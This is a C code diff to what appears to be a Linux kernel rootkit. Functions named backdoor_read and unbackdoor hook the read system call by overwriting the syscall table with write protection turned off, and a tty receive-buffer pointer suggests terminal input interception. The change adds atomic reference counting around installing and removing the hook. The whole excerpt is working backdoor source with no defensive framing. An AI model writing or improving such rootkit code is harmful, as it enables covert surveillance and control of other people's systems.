@@ -16,9 +16,11 @@ int (*current_receive_buf2)(struct tty_struct *, const unsigned char *, char *, 
 void
 backdoor_read(void)
 {
-    disable_protection();
-    sys_calls[__NR_read] = (void *)g7_read;
-    enable_protection();
+    if (atomic_inc_return(&read_install_count) == 1) {
+        disable_protection();
+        sys_calls[__NR_read] = (void *)g7_read;
+        enable_protection();
+    }
 }
 
 void
@@ -54,16 +56,20 @@ unbackdoor(void)
         tty = NULL;
     }
 
-    if (sys_read) {
-        disable_protection();
-        sys_calls[__NR_read] = (void *)sys_read;
-        enable_protection();
+    if (atomic_dec_return(&read_install_count) < 0) {
+        atomic_set(&read_install_count, 0);
 
-        int cur;
+        if (sys_read) {
+            disable_protection();
+            sys_calls[__NR_read] = (void *)sys_read;
+            enable_protection();
 
-        while ((cur = atomic_read(&read_count)) > 0) {
-            DEBUG_INFO("Waiting for %d tasks", cur);
-            msleep(250);
+            int cur;
+
+            while ((cur = atomic_read(&read_count)) > 0) {
+                DEBUG_INFO("Waiting for %d tasks", cur);
+                msleep(250);
+            }
         }
     }
 }
